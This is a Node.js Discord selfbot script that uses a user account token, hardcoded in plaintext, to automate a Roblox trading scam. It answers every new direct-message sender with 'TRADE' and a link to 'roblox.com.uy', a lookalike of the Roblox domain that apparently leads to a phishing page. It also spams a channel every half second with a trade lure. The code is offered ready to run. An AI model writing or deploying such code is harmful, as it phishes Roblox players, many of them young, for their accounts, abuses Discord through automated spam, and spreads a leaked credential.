const express = require("express"); //oxi
const { Client, MessageEmbed } = require("discord.js-selfbot"); //oxi
const app = express(); //oxi
function sleep(milliseconds) {
  var start = new Date().getTime(); //oxi
  for (var i = 0; i < 1e7; i++) {
    //oxi
    if (new Date().getTime() - start > milliseconds) {
      break; //oxi
    } //oxi
  } //oxi
} //oxi
const http = require("http"); //oxi
app.get("/", (request, response) => {
  //oxi
  console.log(Date.now() + " HostlandÄ±"); //oxi
  response.sendStatus(200); //oxi
}); //oxi
app.listen(process.env.PORT); //oxi
setInterval(() => {
  //oxi
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`); //oxi
}, 280000); //oxi
const Discord = require("discord.js-selfbot"); //oxi
const client = new Discord.Client();
const data = new Map(); //oxi
//oxi//oxi
client.on("ready", () => {
  console.log(`${client.user.username} Successfully Logined!!`); //oxi
});
let sent = [];
client.on("message", async msg => {
  //oxi
  if (msg.channel.type === "dm") {
    //oxi
    //oxi

    if (msg.author.id === client.user.id) {
      //oxi
    } else {
      //oxi
      if (msg.author.bot) {
        //oxi
      } else {
        let oxii = await data.get(msg.author.id); //oxi
        //oxi
        if (oxii === 1) {
        } else {
          //oxi

          if (sent.includes(msg.author.id)) return; //oxi
          sent.push(msg.author.id); //oxi
          msg.channel.startTyping(); //oxi
          await sleep(15); //oxi
          //oxi
          await msg.channel.send("TRADE"); //oxi
          await msg.channel.stopTyping(); //oxi
          await sleep(30); //oxi
          msg.channel.startTyping(); //oxi
          await msg.channel.send("https://roblox.com.uy/users/5907784018/profile")// invite link //oxi
          await msg.channel.stopTyping(); //oxi

          //oxi
          await sleep(10); //oxi
          await msg.channel.send("Add or Join me")
          await msg.channel.stopTyping()
        }
      }
    }
  } //oxi
});

client.on("guildCreate", oxi => {});

//oxi
client.on("ready", () => {
  setInterval(() => {
    let oxi = client.channels.cache.get("964947150272340029"); // j4j channel id id'here
    
     oxi.send("My Leopard For Dough"); //oxi
  }, 500); //oxi
});
client.login("OTg2ODMzMTc3OTk1Nzg0MTk0.GKSYjE.S0NM6eqOt-mPixx8WD4MjUSfsnRfnYlfKH57mo") // your token

